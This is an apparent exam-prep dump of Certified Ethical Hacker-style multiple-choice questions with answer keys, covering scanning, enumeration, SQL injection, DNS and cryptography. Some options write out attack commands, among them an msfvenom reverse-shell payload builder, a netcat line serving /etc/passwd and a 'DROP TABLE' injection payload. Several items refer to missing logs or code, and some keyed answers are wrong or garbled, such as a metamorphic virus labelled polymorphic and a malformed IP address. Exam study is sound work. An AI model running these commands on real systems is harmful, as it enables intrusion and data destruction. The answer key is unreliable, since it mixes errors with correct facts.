"While browsing his Facebook teed, Matt sees a picture one of his friends posted with the caption. ""Learn more about your friends!"", as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate. Matt responds to the questions on the post, a few days later. Mates bank account has been accessed, and the password has been changed. What most likely happened?\nA. Matt inadvertently provided the answers to his security questions when responding to the post.\nB. Matt's bank-account login information was brute forced.\nC. Matt Inadvertently provided his password when responding to the post.\nD. Matt's computer was infected with a keylogger.\n","Answer: A — A. Matt inadvertently provided the answers to his security questions when responding to the post."
"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?\nA. nmap -sn -pp < target ip address >\nB. nmap -sn -PO < target IP address >\nC. nmap -sn -PS < target IP address >\nD. nmap -sn -PA < target IP address >\n","Answer: C — C. nmap -sn -PS < target IP address >"
"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?\nA. Cross-site scripting\nB. Denial of service\nC. SQL injection\nD. Directory traversal\n","Answer: D — D. Directory traversal"
"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?\nA. Block port 25 at the firewall.\nB. Shut off the SMTP service on the server.\nC. Force all connections to use a username and password.\nD. Switch from Windows Exchange to UNIX Sendmail.\nE. None of the above.\n","Answer: E — E. None of the above."
"Password cracking programs reverse the hashing process to recover passwords. (True/False.)\nA. True\nB. False\n","Answer: B — B. False"
"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?\nA. Look at the website design, if it looks professional then it is a Real Anti-Virus website\nB. Connect to the site using SSL, if you are successful then the website is genuine\nC. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site\nD. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\nE. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\n","Answer: C — C. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site"
"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?\nA. Server Message Block (SMB)\nB. Network File System (NFS)\nC. Remote procedure call (RPC)\nD. Telnet\n","Answer: A — A. Server Message Block (SMB)"
"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?\nA. Password key hashing\nB. Password salting\nC. Password hashing\nD. Account lockout\n","Answer: B — B. Password salting"
"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?\nA. Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234\nB. Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234\nC. Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password\nD. Use cryptcat instead of netcat\n","Answer: D — D. Use cryptcat instead of netcat"
"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?\nA. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c\nB. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c\nC. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\nD. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\n","Answer: C — C. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe"
"jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However. Jane has a long, complex password on her router. What attack has likely occurred?\nA. Wireless sniffing\nB. Piggybacking\nC. Evil twin\nD. Wardriving\n","Answer: C — C. Evil twin"
"Fred is the network administrator for his company. Fred is testing an internal switch. From an external IP address, Fred wants to try and trick this switch into thinking it already has established a session with his computer. How can Fred accomplish this?\nA. Fred can accomplish this by sending an IP packet with the RST/SIN bit and the source address of his computer.\nB. He can send an IP packet with the SYN bit and the source address of his computer.\nC. Fred can send an IP packet with the ACK bit set to zero and the source address of the switch.\nD. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine.\n","Answer: D — D. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine."
"Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?\nA. WebSite Watcher\nB. web-Stat\nC. Webroot\nD. WAFW00F\n","Answer: B — B. web-Stat"
"An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?\nA. TACACS+\nB. DIAMETER\nC. Kerberos\nD. RADIUS\n","Answer: D — D. RADIUS"
"In your cybersecurity class, you are learning about common security risks associated with web servers. One topic that comes up is the risk posed by using default server settings. Why is using default settings ona web - server considered a security risk, and what would be the best initial step to mitigate this risk?\nA. Default settings cause server malfunctions; simplify the settings\nB. Default settings allow unlimited login attempts; setup account lockout\nC. Default settings reveal server software type; change these settings\nD. Default settings enable auto-updates; disable and manually patch\n","Answer: C — C. Default settings reveal server software type; change these settings"
"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?\nA. Compound SQLi\nB. Blind SQLi\nC. Classic SQLi\nD. DMS-specific SQLi\n","Answer: B — B. Blind SQLi"
"You're the security manager for a tech company that uses a database to store sensitive customer data. You have implemented countermeasures against SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The attacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?\nA. ??OR 'T=""1: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data\nB. ??OR username LIKE '%: This payload uses the LIKE operator to search for a specific pattern in a column\nC. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss\nD. UNION SELECT NULL, NULL, NULL -- : This payload manipulates the UNION SQL operator, enabling the attacker to retrieve data from different database tables\n","Answer: C — C. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss"
"What is the least important information when you analyze a public IP address in a security alert?\nA. DNS\nB. Whois\nC. Geolocation\nD. ARP\n","Answer: D — D. ARP"
"What useful information is gathered during a successful Simple Mail Transfer Protocol (SMTP) enumeration?\nA. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists.\nB. Reveals the daily outgoing message limits before mailboxes are locked\nC. The internal command RCPT provides a list of ports open to message traffic.\nD. A list of all mail proxy server addresses used by the targeted host\n","Answer: A — A. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists."
"Study the following log extract and identify the attack.\nA. Hexcode Attack\nB. Cross Site Scripting\nC. Multiple Domain Traversal Attack\nD. Unicode Directory Traversal Attack\n","Answer: D — D. Unicode Directory Traversal Attack"
"You are analysing traffic on the network with Wireshark. You want to routinely run a cron job which will run the capture against a specific set of IPs - 192.168.8.0/24. What command you would use?\nA. wireshark --fetch ''192.168.8*''\nB. wireshark --capture --local masked 192.168.8.0 ---range 24\nC. tshark -net 192.255.255.255 mask 192.168.8.0\nD. sudo tshark -f''net 192 .68.8.0/24''\n","Answer: D — D. sudo tshark -f''net 192 .68.8.0/24''"
"What does the following command in netcat do? nc -l -u -p55555 < /etc/passwd\nA. logs the incoming connections to /etc/passwd file\nB. loads the /etc/passwd file to the UDP port 55555\nC. grabs the /etc/passwd file when connected to UDP port 55555\nD. deletes the /etc/passwd file when connected to the UDP port 55555\n","Answer: C — C. grabs the /etc/passwd file when connected to UDP port 55555"
"You are programming a buffer overflow exploit and you want to create a NOP sled of 200 bytes in the program exploit.c What is the hexadecimal value of NOP instruction?\nA. 0x60\nB. 0x80\nC. 0x70\nD. 0x90\n","Answer: D — D. 0x90"
"Which of the following is the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?\nA. SOA\nB. biometrics\nC. single sign on\nD. PKI\n","Answer: D — D. PKI"
"What two conditions must a digital signature meet?\nA. Has to be the same number of characters as a physical signature and must be unique.\nB. Has to be unforgeable, and has to be authentic.\nC. Must be unique and have special characters.\nD. Has to be legible and neat.\n","Answer: B — B. Has to be unforgeable, and has to be authentic."
"Which of the following tools can be used to perform a zone transfer?\nA. NSLookup\nB. Finger\nC. Dig\nD. Sam Spade\nE. Host\nF. Netcat\nG. Neotrace\n","Answer: ACDE — A. NSLookup; C. Dig; D. Sam Spade; E. Host"
"One of your team members has asked you to analyze the following SOA record. What is the version? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.) (Choose four.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: A — A. 200303028"
"When discussing passwords, what is considered a brute force attack?\nA. You attempt every single possibility until you exhaust all possible combinations or discover the password\nB. You threaten to use the rubber hose on someone unless they reveal their password\nC. You load a dictionary of words into your cracking program\nD. You create hashes of a large number of words and compare it with the encrypted passwords\nE. You wait until the password expires\n","Answer: A — A. You attempt every single possibility until you exhaust all possible combinations or discover the password"
"You are working as a Security Analyst in a company XYZ that owns the whole subnet range of 23.0.0.0/8 and 192.168.0.0/8. While monitoring the data, you find a high number of outbound connections. You see that IP’s owned by XYZ (Internal) and private IP’s are communicating to a Single Public IP. Therefore, the Internal IP’s are sending data to the Public IP. After further analysis, you find out that this Public IP is a blacklisted IP, and the internal communicating devices are compromised. What kind of attack does the above scenario depict?\nA. Botnet Attack\nB. Spear Phishing Attack\nC. Advanced Persistent Threats\nD. Rootkit Attack\n","Answer: A — A. Botnet Attack"
"Joseph was the Web site administrator for the Mason Insurance in New York, who's main Web site was located at www.masonins.com. Joseph uses his laptop computer regularly to administer the Web site. One night, Joseph received an urgent phone call from his friend, Smith. According to Smith, the main Mason Insurance web site had been vandalized! All of its normal content was removed and replaced with an attacker's message ''Hacker Message: You are dead! Freaks!” From his office, which was directly connected to Mason Insurance's internal network, Joseph surfed to the Web site using his laptop. In his browser, the Web site looked completely intact. No changes were apparent. Joseph called a friend of his at his home to help troubleshoot the problem. The Web site appeared defaced when his friend visited using his DSL connection. So, while Smith and his friend could see the defaced page, Joseph saw the intact Mason Insurance web site. To help make sense of this problem, Joseph decided to access the Web site using hisdial-up ISP. He disconnected his laptop from the corporate internal network and used his modem to dial up the same ISP used by Smith. After his modem connected, he quickly typed www.masonins.com in his browser to reveal the following web page: After seeing the defaced Web site, he disconnected his dial-up line, reconnected to the internal network, and used Secure Shell (SSH) to log in directly to the Web server. He ran Tripwire against the entire Web site, and determined that every system file and all the Web content on the server were intact. How did the attacker accomplish this hack?\nA. ARP spoofing\nB. SQL injection\nC. DNS poisoning\nD. Routing table injection\n","Answer: C — C. DNS poisoning"
"Which of the following algorithms can be used to guarantee the integrity of messages being sent, in transit, or stored?\nA. symmetric algorithms\nB. asymmetric algorithms\nC. hashing algorithms\nD. integrity algorithms\n","Answer: C — C. hashing algorithms"
"In the field of cryptanalysis, what is meant by a “rubber-hose” attack?\nA. Forcing the targeted keystream through a hardware-accelerated device such as an ASIC.\nB. A backdoor placed into a cryptographic algorithm by its creator.\nC. Extraction of cryptographic secrets through coercion or torture.\nD. Attempting to decrypt ciphertext by making logical assumptions about the contents of the original plaintext.\n","Answer: C — C. Extraction of cryptographic secrets through coercion or torture."
"In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account's confidential files and information. How can he achieve this?\nA. Privilege Escalation\nB. Shoulder-Surfing\nC. Hacking Active Directory\nD. Port Scanning\n","Answer: A — A. Privilege Escalation"
"Which DNS resource record can indicate how long any ""DNS poisoning"" could last?\nA. MX\nB. SOA\nC. NS\nD. TIMEOUT\n","Answer: B — B. SOA"
"Based on the following extract from the log of a compromised machine, what is the hacker really trying to steal?\nA. har.txt\nB. SAM file\nC. wwwroot\nD. Repair file\n","Answer: B — B. SAM file"
"You are tasked to configure the DHCP server to lease the last 100 usable IP addresses in subnet to. 1.4.0/23. Which of the following IP addresses could be teased as a result of the new configuration?\nA. 210.1.55.200\nB. 10.1.4.254\nC. 10..1.5.200\nD. 10.1.4.156\n","Answer: C — C. 10..1.5.200"
"Log monitoring tools performing behavioral analysis have alerted several suspicious logins on a Linux server occurring during non-business hours. After further examination of all login activities, it is noticed that none of the logins have occurred during typical work hours. A Linux administrator who is investigating this problem realizes the system time on the Linux server is wrong by more than twelve hours. What protocol used on Linux servers to synchronize the time has stopped working?\nA. Time Keeper\nB. NTP\nC. PPP\nD. OSPP\n","Answer: B — B. NTP"
"Elliot is in the process of exploiting a web application that uses SQL as a back-end database. He’s determined that the application is vulnerable to SQL injection, and has introduced conditional timing delays into injected queries to determine whether they are successful. What type of SQL injection is Elliot most likely performing?\nA. Error-based SQL injection\nB. Blind SQL injection\nC. Union-based SQL injection\nD. NoSQL injection\n","Answer: B — B. Blind SQL injection"
"When a normal TCP connection starts, a destination host receives a SYN (synchronize/start) packet from a source host and sends back a SYN/ACK (synchronize acknowledge). The destination host must then hear an ACK (acknowledge) of the SYN/ACK before the connection is established. This is referred to as the ""TCP three-way handshake."" While waiting for the ACK to the SYN ACK, a connection queue of finite size on the destination host keeps track of connections waiting to be completed. This queue typically empties quickly since the ACK is expected to arrive a few milliseconds after the SYN ACK. How would an attacker exploit this design by launching TCP SYN attack?\nA. Attacker generates TCP SYN packets with random destination addresses towards a victim host\nB. Attacker floods TCP SYN packets with random source addresses towards a victim host\nC. Attacker generates TCP ACK packets with random source addresses towards a victim host\nD. Attacker generates TCP RST packets with random source addresses towards a victim host\n","Answer: B — B. Attacker floods TCP SYN packets with random source addresses towards a victim host"
"Under what conditions does a secondary name server request a zone transfer from a primary name server?\nA. When a primary SOA is higher that a secondary SOA\nB. When a secondary SOA is higher that a primary SOA\nC. When a primary name server has had its service restarted\nD. When a secondary name server has had its service restarted\nE. When the TTL falls to zero\n","Answer: A — A. When a primary SOA is higher that a secondary SOA"
"What tool can crack Windows SMB passwords simply by listening to network traffic?\nA. This is not possible\nB. Netbus\nC. NTFSDOS\nD. L0phtcrack\n","Answer: D — D. L0phtcrack"
"One of your team members has asked you to analyze the following SOA record. What is the TTL? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: D — D. 2400"
"How can you determine if an LM hash you extracted contains a password that is less than 8 characters long?\nA. There is no way to tell because a hash cannot be reversed\nB. The right most portion of the hash is always the same\nC. The hash always starts with AB923D\nD. The left most portion of the hash is always the same\nE. A portion of the hash will be all 0's\n","Answer: B — B. The right most portion of the hash is always the same"
"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may be logged on several files located in /var/log. Which file does NOT belongs to the list:\nA. user.log\nB. auth.fesg\nC. wtmp\nD. btmp\n","Answer: C — C. wtmp"
"When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration. What type of an alert is this?\nA. False negative\nB. True negative\nC. True positive\nD. False positive\n","Answer: D — D. False positive"
"If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use?\nA. –r\nB. –F\nC. –P\nD. –sP\n","Answer: B — B. –F"
"ViruXine.W32 virus hides their presence by changing the underlying executable code. This Virus code mutates while keeping the original algorithm intact, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. Here is a section of the Virus code: What is this technique called?\nA. Polymorphic Virus\nB. Metamorphic Virus\nC. Dravidic Virus\nD. Stealth Virus\n","Answer: A — A. Polymorphic Virus"
"Study the snort rule given below: From the options below, choose the exploit against which this rule applies.\nA. WebDav\nB. SQL Slammer\nC. MS Blaster\nD. MyDoom\n","Answer: C — C. MS Blaster"
"“........is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hot- spot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent web site and luring people there.” Fill in the blank with appropriate choice.\nA. Evil Twin Attack\nB. Sinkhole Attack\nC. Collision Attack\nD. Signal Jamming Attack\n","Answer: A — A. Evil Twin Attack"
"You need a tool that can do network intrusion prevention and intrusion detection, function as a network sniffer, and record network activity, what tool would you most likely select?\nA. Nmap\nB. Cain & Abel\nC. Nessus\nD. Snort\n","Answer: D — D. Snort"
"While performing online banking using a Web browser, a user receives an email that contains a link to an interesting Web site. When the user clicks on the link, another Web browser session starts and displays a video of cats playing a piano. The next business day, the user receives what looks like an email from his bank, indicating that his bank account has been accessed from a foreign country. The email asks the user to call his bank and verify the authorization of a funds transfer that took place. What Web browser-based security vulnerability was exploited to compromise the user?\nA. Clickjacking\nB. Cross-Site Scripting\nC. Cross-Site Request Forgery\nD. Web form input validation\n","Answer: C — C. Cross-Site Request Forgery"
"User A is writing a sensitive email message to user B outside the local network. User A has chosen to use PKI to secure his message and ensure only user B can read the sensitive email. At what layer of the OSI layer does the encryption and decryption of the message take place?\nA. Application\nB. Transport\nC. Session\nD. Presentation\n","Answer: D — D. Presentation"
"A penetration tester is conducting a port scan on a specific host. The tester found several ports opened that were confusing in concluding the Operating System (OS) version installed. Considering that NMAP result below, which of the following is likely to be installed on the target machine by the OS? Starting NMAP 5.21 at 2011-03-15 11:06 NMAP scan report for 172.16.40.65 Host is up (1.00s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http 139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp open MAC Address: 00:00:48:0D:EE:8\nA. The host is likely a Linux machine.\nB. The host is likely a printer.\nC. The host is likely a router.\nD. The host is likely a Windows machine.\n","Answer: B — B. The host is likely a printer."
"Which type of sniffing technique is generally referred as MiTM attack?\nA. Password Sniffing\nB. ARP Poisoning\nC. Mac Flooding\nD. DHCP Sniffing\n","Answer: B — B. ARP Poisoning"
"Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?\nA. Disable unused ports in the switches\nB. Separate students in a different VLAN\nC. Use the 802.1x protocol\nD. Ask students to use the wireless network\n","Answer: C — C. Use the 802.1x protocol"
"A zone file consists of which of the following Resource Records (RRs)?\nA. DNS, NS, AXFR, and MX records\nB. DNS, NS, PTR, and MX records\nC. SOA, NS, AXFR, and MX records\nD. SOA, NS, A, and MX records\n","Answer: D — D. SOA, NS, A, and MX records"
"Which system consists of a publicly available set of databases that contain domain name registration contact information?\nA. WHOIS\nB. CAPTCHA\nC. IANA\nD. IETF\n","Answer: A — A. WHOIS"
"During an Xmas scan what indicates a port is closed?\nA. No return response\nB. RST\nC. ACK\nD. SYN\n","Answer: B — B. RST"
"Every company needs a formal written document which spells out to employees precisely what they are allowed to use the company's systems for, what is prohibited, and what will happen to them if they break the rules. Two printed copies of the policy should be given to every employee as soon as possible after they join the organization. The employee should be asked to sign one copy, which should be safely filed by the company. No one should be allowed to use the company's computer systems until they have signed the policy in acceptance of its terms. What is this document called?\nA. Information Audit Policy (IAP)\nB. Information Security Policy (ISP)\nC. Penetration Testing Policy (PTP)\nD. Company Compliance Policy (CCP)\n","Answer: B — B. Information Security Policy (ISP)"
"Eve is spending her day scanning the library computers. She notices that Alice is using a computer whose port 445 is active and listening. Eve uses the ENUM tool to enumerate Alice machine. From the command prompt, she types the following command. What is Eve trying to do?\nA. Eve is trying to connect as a user with Administrator privileges\nB. Eve is trying to enumerate all users with Administrative privileges\nC. Eve is trying to carry out a password crack for user Administrator\nD. Eve is trying to escalate privilege of the null user to that of Administrator\n","Answer: C — C. Eve is trying to carry out a password crack for user Administrator"
"Bob is going to perform an active session hijack against Brownies Inc. He has found a target that allows session oriented connections (Telnet) and performs the sequence prediction on the target operating system. He manages to find an active session due to the high level of traffic on the network. What is Bob supposed to do next?\nA. Take over the session\nB. Reverse sequence prediction\nC. Guess the sequence numbers\nD. Take one of the parties offline\n","Answer: C — C. Guess the sequence numbers"
"The network team has well-established procedures to follow for creating new rules on the firewall. This includes having approval from a manager prior to implementing any new rules. While reviewing the firewall configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would be a good step to have in the procedures for a situation like this?\nA. Have the network team document the reason why the rule was implemented without prior manager approval.\nB. Monitor all traffic using the firewall rule until a manager can approve it.\nC. Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.\nD. Immediately roll back the firewall rule until a manager can approve it\n","Answer: D — D. Immediately roll back the firewall rule until a manager can approve it"
"Bob, a system administrator at TPNQM SA, concluded one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers/ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA. In this context, what can you say?\nA. Bob can be right since DMZ does not make sense when combined with stateless firewalls\nB. Bob is partially righ\nC. He does not need to separate networks if he can create rules by destination IPs, one by one\nD. Bob is totally wron\nE. DMZ is always relevant when the company has internet servers and workstations\nF. Bob is partially righ\nG. DMZ does not make sense when a stateless firewall is available\n","Answer: C — C. He does not need to separate networks if he can create rules by destination IPs, one by one"
"As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?\nA. Service Level Agreement\nB. Project Scope\nC. Rules of Engagement\nD. Non-Disclosure Agreement\n","Answer: C — C. Rules of Engagement"
"A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?\nA. The computer is not using a private IP address.\nB. The gateway is not routing to a public IP address.\nC. The gateway and the computer are not on the same network.\nD. The computer is using an invalid IP address.\n","Answer: B — B. The gateway is not routing to a public IP address."
"To determine if a software program properly handles a wide range of invalid input, a form of automated testing can be used to randomly generate invalid input in an attempt to crash the program. What term is commonly used when referring to this type of testing?\nA. Randomizing\nB. Bounding\nC. Mutating\nD. Fuzzing\n","Answer: D — D. Fuzzing"
"In the context of Windows Security, what is a 'null' user?\nA. A user that has no skills\nB. An account that has been suspended by the admin\nC. A pseudo account that has no username and password\nD. A pseudo account that was created for security administration purpose\n","Answer: C — C. A pseudo account that has no username and password"
"An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections. When users accessed any page, the applet ran and exploited many machines. Which one of the following tools the hacker probably used to inject HTML code?\nA. Wireshark\nB. Ettercap\nC. Aircrack-ng\nD. Tcpdump\n","Answer: B — B. Ettercap"
"Matthew, a black hat, has managed to open a meterpreter session to one of the kiosk machines in Evil Corp’s lobby. He checks his current SID, which is S-1-5-21-1223352397-1872883824-861252104-501. What needs to happen before Matthew has full administrator access?\nA. He must perform privilege escalation.\nB. He needs to disable antivirus protection.\nC. He needs to gain physical access.\nD. He already has admin privileges, as shown by the “501” at the end of the SID.\n","Answer: A — A. He must perform privilege escalation."
"Eric has discovered a fantastic package of tools named Dsniff on the Internet. He has learnt to use these tools in his lab and is now ready for real world exploitation. He was able to effectively intercept communications between the two entities and establish credentials with both sides of the connections. The two remote ends of the communication never notice that Eric is relaying the information between the two. What would you call this attack?\nA. Interceptor\nB. Man-in-the-middle\nC. ARP Proxy\nD. Poisoning Attack\n","Answer: B — B. Man-in-the-middle"
"CompanyXYZ has asked you to assess the security of their perimeter email gateway. From your office in New York, you craft a specially formatted email message and send it across the Internet to an employee of CompanyXYZ. The employee of CompanyXYZ is aware of your test. Your email message looks like this: From: jim_miller@companyxyz.com To: michelle_saunders@companyxyz.com Subject: Test message Date: 4/3/2017 14:37 The employee of CompanyXYZ receives your email message. This proves that CompanyXYZ’s email gateway doesn’t prevent what?\nA. Email Masquerading\nB. Email Harvesting\nC. Email Phishing\nD. Email Spoofing\n","Answer: D — D. Email Spoofing"
"This TCP flag instructs the sending system to transmit all buffered data immediately.\nA. SYN\nB. RST\nC. PSH\nD. URG\nE. FIN\n","Answer: C — C. PSH"
"Peter extracts the SIDs list from Windows 2000 Server machine using the hacking tool ""SIDExtractor"". Here is the output of the SIDs: From the above list identify the user account with System Administrator privileges.\nA. John\nB. Rebecca\nC. Sheela\nD. Shawn\nE. Somia\nF. Chang\nG. Micah\n","Answer: F — F. Chang"
"Although FTP traffic is not encrypted by default, which layer 3 protocol would allow for end-to-end encryption of the connection?\nA. SFTP\nB. Ipsec\nC. SSL\nD. FTPS\n","Answer: B — B. Ipsec"
"Switches maintain a CAM Table that maps individual MAC addresses on the network to physical ports on the switch. In MAC flooding attack, a switch is fed with many Ethernet frames, each containing different source MAC addresses, by the attacker. Switches have a limited memory for mapping various MAC addresses to physical ports. What happens when the CAM table becomes full?\nA. Switch then acts as hub by broadcasting packets to all machines on the network\nB. The CAM overflow table will cause the switch to crash causing Denial of Service\nC. The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF\nD. Every packet is dropped and the switch sends out SNMP alerts to the IDS port\n","Answer: A — A. Switch then acts as hub by broadcasting packets to all machines on the network"
"What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?\nA. Man-in-the-middle attack\nB. Meet-in-the-middle attack\nC. Replay attack\nD. Traffic analysis attack\n","Answer: B — B. Meet-in-the-middle attack"
"Some clients of TPNQM SA were redirected to a malicious site when they tried to access the TPNQM main site. Bob, a system administrator at TPNQM SA, found that they were victims of DNS Cache Poisoning. What should Bob recommend to deal with such a threat?\nA. The use of security agents in clients’ computers\nB. The use of DNSSEC\nC. The use of double-factor authentication\nD. Client awareness\n","Answer: B — B. The use of DNSSEC"
"Why would you consider sending an email to an address that you know does not exist within the company you are performing a Penetration Test for?\nA. To determine who is the holder of the root account\nB. To perform a DoS\nC. To create needless SPAM\nD. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail\nE. To test for virus protection\n","Answer: D — D. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail"
"You have the SOA presented below in your Zone. Your secondary servers have not been able to contact your primary server to synchronize information. How long will the secondary servers attempt to contact the primary server before it considers that zone is dead and stops responding to queries? collegae.edu.SOA, cikkye.edu ipad.college.edu. (200302028 3600 3600 604800 3600)\nA. One day\nB. One hour\nC. One week\nD. One month\n","Answer: C — C. One week"
